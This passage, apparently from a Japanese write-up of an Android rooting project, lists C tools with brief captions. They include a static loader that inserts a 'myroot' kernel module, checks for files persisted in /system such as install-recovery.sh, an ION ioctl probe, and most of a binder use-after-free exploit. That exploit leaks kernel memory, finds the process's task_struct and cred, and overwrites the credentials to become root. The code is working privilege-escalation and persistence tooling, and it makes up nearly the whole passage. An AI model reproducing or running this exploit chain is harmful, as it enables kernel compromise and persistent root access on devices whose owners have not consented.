        fprintf(o,"  kernel_size=0x%x ramdisk_size=0x%x\n",ks,rs);
        close(r);
    } else fprintf(o,"  open: %s\n",strerror(errno));

    fprintf(o,"=== can we write misc? (idempotent) ===\n");
    ssize_t w=pwrite(f,&bm,sizeof bm,0);
    fprintf(o,"  write back %zd errno=%d (%s)\n",w,errno,w==(ssize_t)sizeof bm?"OK":"FAILED");
    close(f);

    fprintf(o,"=== recovery boot triggers in init.rc ===\n");
    fprintf(o,"  (checked offline: init reads misc and reboots to recovery when command is set)\n");
    fclose(o);
    return 0;
}
```

（2522 バイト / 63 行 / SHA-256 `e1db31434da4db005420adffaaebd74ff7e86bc15c21cfe669be807959bf05d2`）

### `src/tools/modload.c`

`init_module(2)` を直接呼ぶ静的ローダ（`insmod` が使えないため）。

```c
/* insmod is a toolbox symlink and toolbox is broken on this build, so the boot hook
 * cannot rely on it. This is a static loader: it calls init_module directly. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/stat.h>
int main(int argc, char **argv){
    const char *path = argc > 1 ? argv[1] : "/system/lib/modules/myroot.ko";
    FILE *o = fopen("/data/local/tmp/modload.txt","w");
    if (!o) o = stdout;
    fprintf(o,"uid=%d euid=%d\n", getuid(), geteuid());
    fprintf(o,"loading %s\n", path);
    int f = open(path, O_RDONLY);
    if (f < 0){ fprintf(o,"open: %s\n", strerror(errno)); fclose(o); return 1; }
    struct stat st; fstat(f, &st);
    char *buf = malloc(st.st_size);
    ssize_t n = read(f, buf, st.st_size);
    close(f);
    fprintf(o,"read %zd/%lld bytes\n", n, (long long)st.st_size);
    errno = 0;
    long rc = syscall(105, buf, (unsigned long)n, "");
    fprintf(o,"init_module rc=%ld errno=%d (%s)\n", rc, errno, strerror(errno));
    if (rc == 0){
        int p = open("/proc/myroot", O_WRONLY);
        if (p >= 0){ if (write(p,"1",1)==1) fprintf(o,"/proc/myroot ok, uid=%d\n", getuid()); close(p); }
        else fprintf(o,"/proc/myroot: %s\n", strerror(errno));
    }
    fclose(o);
    return rc == 0 ? 0 : 1;
}
```

（1378 バイト / 35 行 / SHA-256 `6f0a3b3a2323694c033b214bab0db8cb89bb1dab4f117416e7115312540c2d9a`）

## E. 検証ツール

### `src/tools/chk.c`

永続化されたファイルと権限の確認。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
static FILE *o;
int main(void){
    o=fopen("/data/local/tmp/chk.txt","w"); if(!o)o=stdout;
    fprintf(o,"uid=%d\n",getuid());
    const char *p[]={"/system/lib/modules/myroot.ko","/system/etc/install-recovery.sh",NULL};
    for(int i=0;p[i];i++){
        struct stat st;
        if(stat(p[i],&st)==0) fprintf(o,"  %-46s %lld bytes\n",p[i],(long long)st.st_size);
        else fprintf(o,"  %-46s %s\n",p[i],strerror(errno));
    }
    /* can we read it back byte-identical? */
    { int f=open("/system/lib/modules/myroot.ko",O_RDONLY);
      if(f>=0){ char b[16]; ssize_t n=read(f,b,16);
        fprintf(o,"  read back %zd bytes: ",n);
        for(int i=0;i<n;i++) fprintf(o,"%02x",(unsigned char)b[i]);
        fprintf(o,"\n"); close(f);} }
    fclose(o); return 0;
}
```

（930 バイト / 26 行 / SHA-256 `ac82494d0ecb1a289e2db56ece6b63f549acaad585d109b7002a7a8ddc9e4f71`）

### `src/tools/lsx.c`

`/system` 上のファイル存在とラベルの確認。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
static FILE *o;
static int be_root(void){int f=open("/proc/myroot",O_WRONLY);if(f<0)return -1;
 ssize_t w=write(f,"1",1);close(f);return w==1?0:-1;}
static void st1(const char *p){
    struct stat s;
    if(lstat(p,&s)!=0){ fprintf(o,"  %-44s %s\n",p,strerror(errno)); return; }
    fprintf(o,"  %-44s mode=%07o size=%lld",p,s.st_mode,(long long)s.st_size);
    if(S_ISLNK(s.st_mode)){char t[256]={0}; if(readlink(p,t,255)>0) fprintf(o," -> %s",t);}
    fprintf(o,"\n");
}
int main(void){
    o=fopen("/data/local/tmp/lsx.txt","w"); if(!o)o=stdout;
    int r=be_root(); fprintf(o,"root=%d uid=%d\n",r,getuid());
    const char *p[]={
        "/system/bin/calibinit.sh","/system/bin/log_on_boot.sh",
        "/system/bin/dumpall.sh","/system/bin/tcpdump_on_boot.sh",
        "/system/bin/sh","/system/bin/toolbox","/system/bin/kinitlog.sh",
        "/system/lib/modules/myroot.ko","/system/lib/modules/rootload", NULL};
    for(int i=0;p[i];i++) st1(p[i]);
    fclose(o); return 0;
}
```

（1210 バイト / 32 行 / SHA-256 `7588a66206876d7a9bbaeed4ffe78f4d8ba30c9213019dcb83a6250b621833c9`）

### `src/tools/gtest.c`

ゲートの表現力の限界（fd 番号しか認識しない）の実測。

```c
/* Verify the narrowed gate: plant the value 4 in a buffer we own, then ask the gate
 * about that buffer's physical address. If the gate does not pass, the narrowing is
 * broken and any "0 stores" result is meaningless. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;
#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)
struct ion_sync_range_data { s32 fd; u32 offset, size, note; };
#define ION_IOC_SYNC_RANGE _IOWR(ION_TYPE, 11, struct ion_sync_range_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define ION_SLOT 3000

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk(int *h, int *f, u32 *iv){
    struct ion_allocation_data a; memset(&a,0,sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d,0,sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    struct ion_phys_data p; memset(&p,0,sizeof p); p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) < 0) return 0;
    *h = a.handle; *f = d.fd; *iv = p.addr;
    return 1;
}
int main(void){
    LOG = fopen("/data/local/tmp/gtest.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("gtest uid=%d\n", getuid());
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE,&rl)==0){ rl.rlim_cur=rl.rlim_max; setrlimit(RLIMIT_NOFILE,&rl); }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open: %d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ionfd=%d\n", ionfd);

    /* two buffers: one for the planted value, one to become the class fd */
    int h1,f1,h2,f2; u32 iv1=0, iv2=0;
    if (!mk(&h1,&f1,&iv1) || !mk(&h2,&f2,&iv2)){ say("alloc failed\n"); return 0; }
    say("buf1 fd=%d iova=0x%08x ; buf2 fd=%d iova=0x%08x\n", f1, iv1, f2, iv2);

    /* map buf1 and write 4 into it */
    u8 *m = mmap(NULL, PGSZ, PROT_READ|PROT_WRITE, MAP_SHARED, f1, 0);
    if (m == MAP_FAILED){ say("mmap: %d\n", errno); return 0; }
    memset(m, 0, PGSZ);
    u32 four = 4;
    memcpy(m, &four, 4);
    /* cache maintenance so the kernel's view matches */
    struct ion_sync_range_data sr; memset(&sr,0,sizeof sr);
    sr.fd = f1; sr.size = PGSZ; sr.note = 4;
    ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);

    u64 lin = (u64)PAGE_OFFSET_V + iv1 - MEMSTART;
    say("planted 4 at linear 0x%llx\n", (unsigned long long)lin);

    /* case 1: fd 4 is NOT a dmabuf -> the gate should test against nothing */
    say("case 1: fd4 free -> gate(+0)=%d (expect fail)\n", gate(lin));
    say("case 1: gate(+8)=%d (expect fail)\n", gate(lin + 8));

    /* case 2: fd 4 = buf2, and the planted word is 4 */
    if (dup2(f2, 4) < 0){ say("dup2: %d\n", errno); return 0; }
    say("case 2: fd4=buf2 -> gate(+0)=%d (word is 4, expect PASS)\n", gate(lin));
    *(u32*)(m + 8) = 9; ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);
    say("case 2: after writing 9 at +8: gate(+8)=%d (expect fail)\n", gate(lin + 8));
    *(u32*)(m + 8) = 4; ioctl(ionfd, ION_IOC_SYNC_RANGE, &sr);
    say("case 2: after writing 4 at +8: gate(+8)=%d (expect PASS)\n", gate(lin + 8));

    /* case 3: what did the store put at +12? */
    u32 a12 = 0; memcpy(&a12, m + 12, 4);
    say("case 3: word at +12 after the store = 0x%08x (expect 0x%08x from buf2)\n",
        a12, iv2);
    say("GATEDONE\n");
    fclose(LOG);
    return 0;
}
```

（4624 バイト / 110 行 / SHA-256 `6303607fb70976cb2f1b3da14e19d081ba5c2f0a4776f51f8f05d5db113134fb`）

## F. binder UAF の参照実装（QEMU 用）

### `src/tools/broot3.c`

リーク → task_struct → cred 書き換えの完全チェーン。QEMU で 3/3 成功した版。実機では使わない。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/wait.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint16_t u16; typedef uint8_t u8;

struct bwr_t { u64 write_size, write_consumed, write_buffer, read_size, read_consumed, read_buffer; };
struct btd_t { union { u32 handle; u64 ptr; } target; u64 cookie; u32 code; u32 flags;
               s32 sender_pid; s32 sender_euid; u64 data_size, offsets_size;
               union { struct { u64 buffer, offsets; } ptr; u8 buf[8]; } data; };
struct fbo_t { u32 type; u32 flags; union { u64 binder; u32 handle; }; u64 cookie; };

#define BINDER_WRITE_READ _IOWR('b', 1, struct bwr_t)
#define BINDER_THREAD_EXIT _IOW('b', 8, s32)
#define BC_TRANSACTION _IOW('c', 0, struct btd_t)
#define BR_REPLY _IOR('r', 3, struct btd_t)
#define BR_DEAD_REPLY _IO('r', 5)
#define BR_FAILED_REPLY _IO('r', 17)
#define BR_NOOP _IO('r', 12)
#define BR_TRANSACTION_COMPLETE _IO('r', 6)
#define T_HANDLE 0x73682a85u

#define PAGE        4096
#define IOVS        32
#define POOLBASE    0x200000000UL
#define POOLPAGES   64
#define LOCK_AFTER  0x10001
#define LEAK_OFF    (4*PAGE + LOCK_AFTER)
#define DEFSCAN     (64UL*1024*1024)

/* precise write layout, validated by pipesim */
#define IOV3_LEN    (PAGE - 17)
#define PAYMAX      64
#define FEED_FOR(p) (20*PAGE + (p))

/* field offsets, measured with pahole on the same 3.10 config */
#define PROC_PID    0x30
#define PROC_TSK    0x48
#define PROC_TODO   0xC0
#define PROC_WAIT   0xD8
#define TASK_REALCRED 912
#define TASK_CRED     920
#define TASK_COMM     928
#define CRED_UID      4
#define CRED_SECURITY 112

/*
 * Root, with every address read out of the kernel rather than guessed.
 *
 * Step 1: one large leak (default 64MB) forward from chunk+0x50. The whole
 *         window is a contiguous slice of the linear map, so no holes.
 *
 * Step 2: our binder_proc is only a few KB into that window - it is identified
 *         by pid == getpid() plus two self-referential list heads (todo at
 *         +0xC0, wait.task_list at +0xD8). proc->tsk at +0x48 then gives the
 *         exact address of our task_struct. Note this is a POINTER READ from
 *         the window, not a signature hunt, so it works at any distance.
 *
 * Step 3: task->cred lives at tsk+920. If tsk is inside the window we read the
 *         pointer straight out of it. That is the exact cred of this process -
 *         no candidates, no guessing.
 *
 * Step 4: 40 zero bytes at cred+4 clear uid/gid/suid/sgid/euid/egid/fsuid/fsgid,
 *         securebits and both capability masks. getuid() right after the write
 *         is the verdict, so a miss cannot look like a success.
 *
 * If tsk falls outside the window we fall back to scanning for a cred-shaped
 * object (32 bytes of the constant 2000 followed by zeroed caps and a kernel
 * security pointer) and zeroing candidates nearest-first.
 */

static u8 wbuf[8192], rbuf[8192];
static int bfd = -1;
static FILE *LOG;
static u8 *pool;
static u8 *leak;
static struct iovec iovs[IOVS] __attribute__((aligned(4096)));
static size_t g_scan;
static u64 g_chunk;
static u64 g_leak_start = 0;   /* where the overflow window begins */
/* A second, untouched binder connection. get_service() on a connection opened
 * after the big leak fails on this device, but one opened at startup works, so
 * the writer connection is prepared before any leaking happens. */
static int  g_wfd = -1;
static void *g_wmap = MAP_FAILED;
static u32  g_whandle = 0;
static volatile int *go;

static u8 *p32(u8 *p, u32 v){ memcpy(p,&v,4); return p+4; }
static u8 *pstr16(u8 *p, const char *s){
    size_t n = strlen(s);
    p = p32(p, (u32)n);
    for (size_t i=0;i<n;i++){ u16 c=(u16)(unsigned char)s[i]; memcpy(p,&c,2); p+=2; }
    u16 z=0; memcpy(p,&z,2); p+=2;
    while (((uintptr_t)p) & 3) *p++ = 0;
    return p;
}
static int bwr(size_t wl, size_t rl){
    struct bwr_t b; memset(&b,0,sizeof b);
    b.write_size = wl; b.write_buffer = (u64)wbuf;
    b.read_size  = rl; b.read_buffer  = (u64)rbuf;
    int r = ioctl(bfd, BINDER_WRITE_READ, &b);
    if (r < 0) return -errno;
    return (int)b.read_consumed;
}
static size_t mk_txn(u32 handle, u32 code, u64 data, u64 dsz, u32 flags){
    u8 *p = wbuf; u32 cmd = BC_TRANSACTION; memcpy(p,&cmd,4); p += 4;
    struct btd_t t; memset(&t,0,sizeof t);
    t.target.handle = handle; t.code = code; t.flags = flags;
    t.data_size = dsz; t.data.ptr.buffer = data;
    memcpy(p,&t,sizeof t); p += sizeof t;
    return (size_t)(p - wbuf);
}
static int get_service(const char *name, u32 *handle){
    static u8 data[512];
    u8 *d = data;
    d = p32(d, 0);
    d = pstr16(d, "android.os.IServiceManager");
    d = pstr16(d, name);
    size_t wl = mk_txn(0, 1, (u64)data, (u64)(d - data), 0);
    for (int i=0;i<400;i++){
        int n = bwr(i==0?wl:0, 512);
        if (n <= 0){ usleep(1500); continue; }
        u8 *q = rbuf, *end = rbuf + n;
        while (q + 4 <= end){
            u32 c; memcpy(&c,q,4); q += 4;
            if (c==BR_NOOP || c==BR_TRANSACTION_COMPLETE) continue;
            if (c==BR_REPLY){
                struct btd_t *tt = (struct btd_t*)q; q += sizeof(struct btd_t);
                if (!tt->data.ptr.buffer) continue;
                struct fbo_t *o = (struct fbo_t*)(uintptr_t)tt->data.ptr.buffer;
                if (o->type == T_HANDLE){ *handle = o->handle; return 1; }
                return 0;
            }
            if (c==BR_DEAD_REPLY || c==BR_FAILED_REPLY) return -1;
            break;
        }
    }
    return 0;
}
static void *g_bmap = MAP_FAILED;
static int open_binder(void){
    int fd = open("/dev/binder", O_RDONLY | O_NONBLOCK);
    if (fd < 0) return -1;
    /* Keep the mapping: binder_mmap needs it, and binder_deferred_release only
     * frees the binder_proc once BOTH the fd and the vma are gone. Reopening
     * without unmapping leaks 1MB per retry, and the retry loops run tens of
     * thousands of times. */
    g_bmap = mmap(NULL, 0x100000-0x2000, PROT_READ, MAP_PRIVATE|MAP_NORESERVE, fd, 0);
    if (g_bmap == MAP_FAILED){ close(fd); return -1; }
    return fd;
}
static void close_binder(void){
    if (g_bmap != MAP_FAILED){ munmap(g_bmap, 0x100000-0x2000); g_bmap = MAP_FAILED; }
    if (bfd >= 0){ close(bfd); bfd = -1; }
}
/* Drain every pending command so thread->todo is empty and return_error is
 * BR_OK before we try to park. Without this each stale reply from the previous
 * attempt keeps binder_poll on the proc branch and the gate never opens. */
static void flush_thread(void){
    for (int i = 0; i < 64; i++){
        memset(rbuf, 0, 16);
        int n = bwr(0, 512);
        if (n <= 0) break;      /* -EAGAIN: nothing left */
    }
}

static int open_gate(u32 h, int *epfd_out){
    flush_thread();
    size_t wl = mk_txn(h, 0xdead, 0, 0, 0);
    bwr(wl, 0);
    memset(rbuf, 0, 16);
    int n = bwr(0, 256);
    /* Require exactly NOOP + TRANSACTION_COMPLETE with nothing else queued.
     * Extra commands (the service's own BR_TRANSACTION) change the parking
     * state and the reclaim stops happening, so retry rather than accept. */
    if (!(n == 8 && rbuf[0]==0x0c && rbuf[4]==0x06)) return 0;
    int epfd = epoll_create(1000);
    struct epoll_event ev; memset(&ev,0,sizeof ev); ev.events = EPOLLIN;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) != 0){ close(epfd); return 0; }
    struct epoll_event out; memset(&out,0,sizeof out);
    if (epoll_wait(epfd, &out, 1, 0) != 0){ close(epfd); return 0; }
    *epfd_out = epfd;
    return 1;
}

static ssize_t do_bigleak(u32 h){
    int epfd = -1;
    if (!open_gate(h, &epfd)) return -2;
    int pp[2]; if (pipe(pp)){ close(epfd); return -1; }
    /* Keep this at one page like bask6. A large pipe changes the parking point
     * and the reclaim stops happening, which shows up as writev == 4*PAGE. */
    fcntl(pp[1], F_SETPIPE_SZ, PAGE);

    for (int i=0;i<4;i++){ iovs[i].iov_base = pool + (size_t)i*PAGE; iovs[i].iov_len = PAGE; }
    iovs[4].iov_base = pool; iovs[4].iov_len = 0;
    /* On this device task_struct sits BELOW chunk (232MB down in the measured
     * run), so an upward window never reaches it. Point the overflow downward:
     * iov[5] is overwritten to {start, len} by the aim bytes, and the following
     * pipe buffers are then READ from that address. */
    iovs[5].iov_base = (void*)(uintptr_t)g_leak_start;
    iovs[5].iov_len  = g_scan + 4*PAGE;

    pid_t c = fork();
    if (c < 0){ close(pp[0]); close(pp[1]); close(epfd); return -1; }
    if (c == 0){
        close(pp[1]);
        static u8 buf[262144];
        struct epoll_event e2; memset(&e2,0,sizeof e2); e2.events = EPOLLIN;
        /* A short fixed delay is what makes the reclaim land: by then the parent
         * is parked on a full pipe with iov[4].len still 0, so the DEL's unlock
         * writes 0x10001 into it and the next drain overflows into kernel
         * memory. Gating the DEL on FIONREAD races with that first copy. */
        usleep(8000);
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &e2);
        long drained = 0;
        size_t total = (size_t)drained;
        if (total > g_scan) total = g_scan;
        for (;;){
            ssize_t r = read(pp[0], buf, sizeof buf);
            if (r <= 0) break;
            if (total < g_scan){
                size_t cc = (size_t)r;
                if (cc > g_scan - total) cc = g_scan - total;
                memcpy(leak + total, buf, cc);
            }
            total += (size_t)r;
        }
        _exit(0);
    }
    close(pp[0]);
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    errno = 0;
    ssize_t w = writev(pp[1], iovs, IOVS);
    int e = errno;
    close(pp[1]);
    int st = 0; waitpid(c, &st, 0);
    close(epfd);
    fprintf(LOG, "  bigleak: writev=%zd errno=%d\n", w, e);
    return w;
}

static int do_write(u32 h, u64 addr, const u8 *pay, size_t paylen){
    int epfd = -1;
    if (!open_gate(h, &epfd)){
        fprintf(LOG, "    gate closed before write (h=%u)\n", h);
        fflush(LOG);
        return 0;
    }
    int pp[2]; if (pipe(pp)){ close(epfd); return 0; }
    fcntl(pp[1], F_SETPIPE_SZ, PAGE);      /* one page: the layout depends on it */
    *go = 0;

    const size_t FEED = FEED_FOR(paylen);
    for (int i=0;i<3;i++){ iovs[i].iov_base = pool + (size_t)i*PAGE; iovs[i].iov_len = PAGE; }
    iovs[3].iov_base = pool + 3*PAGE; iovs[3].iov_len = IOV3_LEN;
    iovs[4].iov_base = pool;          iovs[4].iov_len = 0;
    iovs[5].iov_base = pool + 40*PAGE;
    iovs[5].iov_len  = FEED - (3*PAGE + IOV3_LEN);
    memset(pool + 40*PAGE, 0x5a, PAGE);

    pid_t c = fork();
    if (c < 0){ close(pp[0]); close(pp[1]); close(epfd); return 0; }
    if (c == 0){
        close(pp[0]);
        { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof cs,&cs); }
        for (long i = 0; i < 20000000 && !*go; i++) usleep(5);
        usleep(6000);
        struct epoll_event e2; memset(&e2,0,sizeof e2); e2.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &e2);

        static u8 pg[PAGE];
        memset(pg, 0x41, sizeof pg);
        /* Measured on the device kernel: the payload lands exactly at
         * `base`. The aim's own copy consumes bytes from the entry it just
         * wrote, so iov[5].base already holds the destination by the time
         * the payload call runs. base = addr, not addr-16. */
        u64 base = addr, len = 0x100000;
        memcpy(pg + PAGE - 16, &base, 8);
        memcpy(pg + PAGE - 8,  &len,  8);
        for (int i = 0; i < 20; i++)
            if (write(pp[1], pg, PAGE) != (ssize_t)PAGE) _exit(0);
        if (write(pp[1], pay, paylen) != (ssize_t)paylen) _exit(0);
        _exit(0);
    }
    close(pp[1]);
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    *go = 1;
    errno = 0;
    ssize_t r = readv(pp[0], iovs, IOVS);
    int e = errno;
    close(pp[0]);
    int st = 0; waitpid(c, &st, 0);
    close(epfd);
    fprintf(LOG, "    do_write readv=%zd errno=%d feed=%zu\n", r, e, FEED);
    fflush(LOG);
    return r == (ssize_t)FEED;
}

int main(int argc, char **argv){
    g_scan = DEFSCAN;
    if (argc > 1) g_scan = (size_t)strtoul(argv[1], NULL, 0);
    size_t map = g_scan + (2UL<<20);

    LOG = fopen("/data/local/tmp/root3.txt","w"); if(!LOG) LOG=stdout;
    setbuf(LOG, NULL);
    signal(SIGPIPE, SIG_IGN);
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs); }

    pool = mmap((void*)POOLBASE, (size_t)POOLPAGES*PAGE, PROT_READ|PROT_WRITE,
                MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    leak = mmap(NULL, map, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    go   = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (pool==MAP_FAILED || leak==MAP_FAILED || go==MAP_FAILED){
        fprintf(LOG,"mmap fail (%zu)\n", map); return 1; }
    memset(pool, 0x41, (size_t)POOLPAGES*PAGE);
    *go = 0;

    const int mypid = getpid();
    fprintf(LOG,"pid=%d uid=%d scan=%zuMB\n", mypid, getuid(), g_scan>>20); fflush(LOG);

    bfd = open_binder();
    if (bfd < 0){ fprintf(LOG,"open fail %d\n", errno); return 1; }
    u32 h = 0;
    if (get_service("activity", &h) <= 0){
        if (!getenv("BINDER_QEMU")){ fprintf(LOG,"no svc\n"); return 1; }
        h = 0;
        fprintf(LOG,"no servicemanager; using context manager handle 0\n");
        /* The failed get_service() left return_error = BR_FAILED_REPLY on this
         * thread, and binder_poll() refuses the thread->wait branch while that
         * is set. A fresh connection has a fresh binder_thread, so reopen. */
        close_binder(); bfd = open_binder();
        if (bfd < 0){ fprintf(LOG,"reopen after svc failure failed\n"); return 1; }
    }

    /* Populate the binder slabs first. In QEMU this process is nearly the only
     * binder client, so the page around our freed thread is mostly untouched;
     * on the device dozens of procs are alive and the proc lands a few KB into
     * the window. Holding a handful of extra procs makes the layout comparable. */
    int keep[24]; int nkeep = 0;
    for (int i = 0; i < 24; i++){
        int fd = open_binder();
        if (fd < 0) break;
        keep[nkeep++] = fd;
    }
    fprintf(LOG, "holding %d extra binder procs\n", nkeep); fflush(LOG);

    /* A miss on the task_struct scan is not fatal: a fresh leak frees and
     * reallocates the binder_thread, so chunk moves and the 64MB slice covers
     * different memory. Repeat the whole leak+scan until the task is found. */
    u64 tsk = 0, credp = 0;
    const u8 *seg = NULL;
    size_t n = 0;
    u64 base = 0;
    for (int outer = 1; outer <= 6 && !tsk; outer++){
    if (outer > 1){
        fprintf(LOG, "--- outer attempt %d ---\n", outer);
        fflush(LOG);
        close_binder(); bfd = open_binder();
        if (bfd < 0){ fprintf(LOG, "  reopen failed\n"); break; }
        if (get_service("activity", &h) <= 0){
            if (!getenv("BINDER_QEMU")){ fprintf(LOG, "  svc lost\n"); break; }
            h = 0;
            close_binder(); bfd = open_binder();
            if (bfd < 0){ fprintf(LOG, "  reopen2 failed\n"); break; }
        }
    }

    /* ---------- stage 1: big leak ---------- */
    ssize_t w = -1;
    for (int t = 1; t <= 30000 && w < 0; t++){
        w = do_bigleak(h);
        if (w < 0){
            if (t <= 3) fprintf(LOG,"  leak try %d returned %zd\n", t, w);
            memset(rbuf,0,64); bwr(0,512);
            close_binder(); bfd = open_binder();
            if (bfd < 0){ fprintf(LOG,"  reopen failed errno=%d\n", errno); break; }
            if (get_service("activity",&h) <= 0){
                if (!getenv("BINDER_QEMU")){ fprintf(LOG,"  svc lost\n"); break; }
                h = 0;
            }
        }
    }
    if (w < 0){ fprintf(LOG,"RESULT: leak never landed (last w=%zd)\n", w); return 1; }

    u64 self = 0;
    if (w > (ssize_t)LEAK_OFF) memcpy(&self, leak + LEAK_OFF, 8);
    g_chunk = (self >= 0xffffffc000000000ULL) ? self - 0x50 : 0;
    if (!g_chunk){ fprintf(LOG,"RESULT: no landing\n"); return 1; }
    (void)g_leak_start;

    { /* hand the window to the host for offline analysis */
      int fd = open("/data/local/tmp/big.bin", O_WRONLY|O_CREAT|O_TRUNC, 0600);
      if (fd >= 0){
          size_t off = 0, lim = (size_t)w;
          if (lim > 32UL*1024*1024) lim = 32UL*1024*1024;
          while (off < lim){
              size_t cc = lim - off; if (cc > (1<<20)) cc = 1<<20;
              ssize_t k = write(fd, leak + off, cc);
              if (k <= 0) break;
              off += (size_t)k;
          }
          close(fd);
          fprintf(LOG, "  leak written to /data/local/tmp/big.bin (%zu bytes)\n", lim);
      }
    }

    seg = leak + LEAK_OFF;
    n = (size_t)w - LEAK_OFF;
    base = g_chunk + 0x50;
    fprintf(LOG,"leaked %zd bytes: 0x%016llx..0x%016llx (%.1f MB)\n",
            w, (unsigned long long)base, (unsigned long long)(base+n),
            (double)w/1048576.0);
    fflush(LOG);

    { /* the window starts at chunk+0x50; print the first 2KB so the layout is
       * visible in the log without needing to fetch a file */
      for (int row = 0; row < 16; row++){
          fprintf(LOG, "  +0x%04x:", row*128);
          for (int i = 0; i < 16; i++){
              u64 v; memcpy(&v, seg + row*128 + i*8, 8);
              fprintf(LOG, " %016llx", (unsigned long long)v);
          }
          fprintf(LOG, "\n");
      }
      fflush(LOG);
    }

    /* ---------- stage 2a: binder_proc -> tsk ---------- */
    u64 proc_tsk[8]; int nproc = 0;
    for (size_t o = 0xC0; o + 0x120 < n; o += 8){
        long po = (long)o - PROC_TODO;
        if (po < 0) continue;
        u32 ppid = 0; memcpy(&ppid, seg + po + PROC_PID, 4);
        if (ppid != (u32)mypid) continue;
        u64 t = 0; memcpy(&t, seg + po + PROC_TSK, 8);
        if (t < 0xffffffc000000000ULL || t >= 0xffffffc080000000ULL) continue;
        if (t & 7) continue;
        u64 fil = 0; memcpy(&fil, seg + po + 0x50, 8);
        if (fil < 0xffffffc000000000ULL || fil >= 0xffffffc080000000ULL) continue;
        u64 a_todo = base + (u64)po + PROC_TODO;
        u64 a_wait = base + (u64)po + PROC_WAIT;
        u64 v1, v2;
        memcpy(&v1, seg + po + PROC_TODO, 8);
        memcpy(&v2, seg + po + PROC_TODO + 8, 8);
        int todo_self = (v1 == a_todo && v2 == a_todo);
        memcpy(&v1, seg + po + PROC_WAIT, 8);
        memcpy(&v2, seg + po + PROC_WAIT + 8, 8);
        int wait_self = (v1 == a_wait && v2 == a_wait);
        if (!todo_self && !wait_self) continue;
        nproc++;
        proc_tsk[nproc-1] = t;
        if (nproc <= 8)
            fprintf(LOG, "  binder_proc 0x%016llx -> tsk 0x%016llx\n",
                    (unsigned long long)(base + (u64)po), (unsigned long long)t);
        if (nproc == 8) break;
    }
    /* One proc pointing at a task is weak evidence; several procs that all
     * point at the SAME task is strong, because each fd we opened produced its
     * own binder_proc with the same ->tsk. */
    /* A single proc is the common case on the device. Keep every candidate and
     * resolve it empirically later: write the cred pointer and see whether
     * getuid() moves. A wrong guess is harmless because the target is a valid
     * kernel object either way. */
    if (nproc >= 1 && !tsk){
        tsk = proc_tsk[0];
        fprintf(LOG, "  %d proc candidate(s), first tsk 0x%016llx\n", nproc,
                (unsigned long long)tsk);
    }

